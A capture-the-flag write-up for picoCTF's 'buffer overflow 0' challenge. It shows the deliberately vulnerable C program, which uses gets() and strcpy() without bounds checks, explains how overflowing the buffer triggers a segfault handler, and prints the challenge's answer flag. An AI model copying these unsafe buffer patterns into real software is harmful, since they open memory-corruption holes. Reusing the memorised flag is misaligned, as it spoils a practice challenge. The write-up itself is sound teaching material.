## Introduction
**Challenge:** [buffer overflow 0](https://play.picoctf.org/practice/challenge/257?originalEvent=70&page=1)

**Category:** Binary Exploitation

**Description:**

Smash the stack.
Let's start off simple, can you overflow the correct buffer? The program is available [here](https://artifacts.picoctf.net/c/521/vuln). You can view the source [here](https://artifacts.picoctf.net/c/521/vuln.c). And connect with it using:
```bash
nc saturn.picoctf.net 65355
```

## Solution
Here we've been provided with the binary executable and the source code. Let's take a look at the source code.
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}

void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input);
}

int main(int argc, char **argv){

  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler); // Set up signal handler

  gid_t gid = getegid();
  setresgid(gid, gid, gid);


  printf("Input: ");
  fflush(stdout);
  char buf1[100];
  gets(buf1);
  vuln(buf1);
  printf("The program will exit now\n");
  return 0;
}
```
The one thing that I noticed is that we are printing the flag on a segmentation fault, which is an error raised by memory-protected hardware whenever it tries to access a memory address that is either restricted or does not exist. If the flag `printf()` resides within `sigsegv_handler()`, then we can safely assume that we must figure out how to trigger a segmentation fault.
```c
void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}
```
We see that on line 40, the horrible `gets()` is called, and reads buf1 (the user input) onto the stack. This function sucks, as it will write the userâ€™s input to the stack without regard to its allocated length. The user can simply overflow this length, and the program will pass their input into the `vuln()` function to trigger a segmentation fault:
```c
void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input);
}

gets(buf1); 
vuln(buf1);
```
Let's run the program and see if we get the flag if we did a segmentation fault:
```bash
nc saturn.picoctf.net 65355
Input: aaaaaaaaaaaaaaaaaaaaaaaaaaa
picoCTF{ov3rfl0ws_ar3nt_that_bad_34d6b87f}
```
Yeah, we got the flag!

## Conclusion
Basically what we did was we did a buffer overflow. That means we have exceeded the size of a buffer.

**Flag:** `picoCTF{ov3rfl0ws_ar3nt_that_bad_34d6b87f}`
